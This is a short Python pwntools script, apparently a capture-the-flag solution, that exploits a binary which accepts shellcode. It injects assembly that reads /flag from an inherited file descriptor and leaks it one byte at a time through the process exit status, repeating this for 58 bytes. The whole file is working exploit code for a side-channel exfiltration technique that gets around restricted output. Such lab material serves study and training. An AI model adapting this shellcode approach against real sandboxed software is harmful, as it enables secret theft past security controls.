#!/bin/python

import os
import sys
from pwn import * 

context.log_level = 'error'
context.arch = 'amd64'

FLAG_LEN = 58
WRITABLE_MEM = 0x1337000 + 0x1000 - FLAG_LEN - 100

flag = bytearray(FLAG_LEN)

for i in range(FLAG_LEN):
    if (len(sys.argv) > 2):
        proc = process(['sudo', 'strace', sys.argv[1]])
    else:
        proc = process([sys.argv[1], '/flag'], close_fds=False)

    sc_bytes = (shellcraft.read(3, WRITABLE_MEM, FLAG_LEN)
              +
                f'''
                    mov rdi, {WRITABLE_MEM+i}
                    mov rdi, [rdi]
                    mov rax, 0x3C
                    syscall
                 '''
    )

    proc.send(asm(sc_bytes, arch='amd64'))
    byte = proc.poll(block=True)
    if byte >= 0 and byte <= 255:
        flag[i] = byte
    else: 
        print(f"Iteration #{i} has invalid byte ({byte})")

print(flag)
